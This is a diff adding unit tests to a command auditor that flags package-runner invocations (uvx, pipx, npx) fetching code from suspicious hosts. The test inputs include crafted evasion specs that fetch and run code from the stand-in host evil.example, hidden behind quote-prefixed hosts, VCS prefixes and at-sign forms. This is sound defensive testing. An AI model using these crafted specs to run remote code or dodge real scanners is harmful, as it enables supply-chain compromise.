@@ -463,6 +463,85 @@ class TestAnImpostorIsStillCritical(unittest.TestCase):
             found = audit("uvx", "--from", spec, "t")
             self.assertIn(("high", "unparseable-url"), verdict(found), spec)
 
+    #: The first characters of a host that the scan for endpoints does not
+    #: take for the start of one (it would find `"https://"` in a script).
+    ODD_STARTS = ("'", '"', "<", ">")
+
+    def test_a_source_whose_host_starts_with_a_quote_or_a_bracket(self):
+        # Round 3, A6: `uvx --from "git+https://'evil.example/o/r" tool` gave
+        # no finding while `https://'evil.example/o/r` as an argument of its
+        # own is critical. The `git+` kept the argument from being read as the
+        # URL it is; what a program takes out of the spec is what follows it.
+        shapes = (lambda s: ("uvx", ["--from", s, "t"]),
+                  lambda s: ("uvx", ["--from=" + s, "t"]),
+                  lambda s: ("uvx", ["--with", s, "t"]),
+                  lambda s: ("uvx", [s]),
+                  lambda s: ("pipx", ["run", "--spec", s, "t"]),
+                  lambda s: ("npx", ["-y", s]),
+                  lambda s: ("npx", ["-p", s, "t"]),
+                  lambda s: ("npx", ["--package=" + s, "t"]))
+        for mark in self.ODD_STARTS:
+            bare = "https://" + mark + "evil.example/o/r"
+            want = audit("uvx", bare)
+            self.assertEqual(verdict(want),
+                             [("critical", "exfiltration-endpoint")], mark)
+            for prefix in ("git+", "GIT+", "hg+", "svn+", "bzr+"):
+                for shape in shapes:
+                    command, args = shape(prefix + bare)
+                    with self.subTest(mark=mark, command=command, args=args):
+                        self.assertEqual(audit(command, *args), want)
+
+    def test_a_spec_that_names_its_source_after_an_at_sign(self):
+        # `name @ URL` (PEP 508) and `name@URL` (npm) are read the same way.
+        for mark in self.ODD_STARTS:
+            bare = "https://" + mark + "evil.example/o/r"
+            want = audit("uvx", bare)
+            for spec in ("tool @ " + bare, "tool@" + bare,
+                         "tool @ git+" + bare, "tool@git+" + bare):
+                for command, args in (("uvx", ["--from", spec, "t"]),
+                                      ("uvx", ["--from=" + spec, "t"]),
+                                      ("npx", ["-y", spec])):
+                    with self.subTest(mark=mark, command=command, args=args):
+                        self.assertEqual(audit(command, *args), want)
+
+    def test_in_the_environment_it_is_medium_as_any_endpoint_there(self):
+        for mark in self.ODD_STARTS:
+            for value in ("https://%sevil.example/o/r" % mark,
+                          "git+https://%sevil.example/o/r" % mark):
+                with self.subTest(mark=mark, value=value):
+                    found = audit("uvx", "t==1.0.0", env={"SOURCE": value})
+                    self.assertEqual(verdict(found),
+                                     [("medium", "exfiltration-endpoint")])
+                    self.assertIn("env:SOURCE", found[0]["message"])
+
+    def test_the_odd_host_is_named_and_the_path_is_not(self):
+        found = audit("uvx", "--from", "git+https://'evil.example/o/r/FAKE-path",
+                      "t")
+        self.assertEqual(len(found), 1, found)
+        self.assertIn("evil.example", found[0]["message"])
+        self.assertNotIn("FAKE-path", found[0]["message"])
+
+    def test_the_prefix_changes_nothing_for_a_host_that_is_fine(self):
+        # a forge is judged by its pin, the local machine is quiet, and a
+        # version-control prefix on another kind of repository is no excuse
+        found = audit("uvx", "--from", "git+https://github.com/o/r", "t")
+        self.assertEqual(verdict(found), [("medium", "git-source")])
+        for spec in ("git+http://localhost:3000/o/r",
+                     "git+https://127.0.0.1/o/r"):
+            with self.subTest(spec):
+                self.assertEqual(audit("uvx", "--from", spec, "t"), [])
+        found = audit("uvx", "--from", "hg+https://github.com/o/r", "t")
+        self.assertEqual(verdict(found),
+                         [("critical", "exfiltration-endpoint")])
+
+    def test_a_userinfo_is_not_taken_for_the_name_of_a_spec(self):
+        # what follows the "@" of a userinfo is a host, not a URL, and the
+        # password is not printed
+        found = audit("uvx", "--from", "https://u:FAKE-pw@evil.example/o/r", "t")
+        self.assertEqual(verdict(found),
+                         [("critical", "exfiltration-endpoint")])
+        self.assertNotIn("FAKE-pw", text(found))
+
     def test_a_source_is_only_a_source_where_the_runner_reads_one(self):
         url = "https://github.com/o/r"
         for command, args in (
@@ -574,11 +653,14 @@ class TestAnImpostorIsStillCritical(unittest.TestCase):
     def test_a_value_the_text_does_not_spell_is_judged_as_the_text_reads(self):
         # The shell reads `"https://npm.internal.example"/` as one word, the
         # registry URL. The text has a quote in it, so the value is not found
-        # in it as written: no verdict of its own, and the URL is an endpoint.
+        # in it as written: no verdict of its own there, and the URL the text
+        # spells is an endpoint. The word the shell hands over is read as
+        # well, and that one is the registry: both are reported.
         found = audit("bash", "-c", 'npx --registry '
                       '"https://npm.internal.example"/ -y p@1.0.0')
         self.assertEqual(verdict(found),
-                         [("critical", "exfiltration-endpoint")])
+                         [("critical", "exfiltration-endpoint"),
+                          ("medium", "package-registry")])
 
     def test_a_value_that_cannot_be_taken_apart_is_not_excused(self):
         for command, args in (
@@ -626,6 +708,12 @@ class TestRolesAreBounded(unittest.TestCase):
         self.assertEqual(len(found), n - 64)
         self.assertEqual({(f["severity"], f["check"]) for f in found},
                          {("critical", "exfiltration-endpoint")})
+
+    def test_reading_a_spec_for_its_url_is_linear_in_the_text(self):
+        for text in ("@" * 400000, "@ " * 200000, "@" + " " * 400000 + "x"):
+            start = time.perf_counter()
+            detectors._values(text)
+            self.assertLess(time.perf_counter() - start, 2, text[:4])
 
     def test_the_same_value_repeated_is_one_value(self):
         args = []
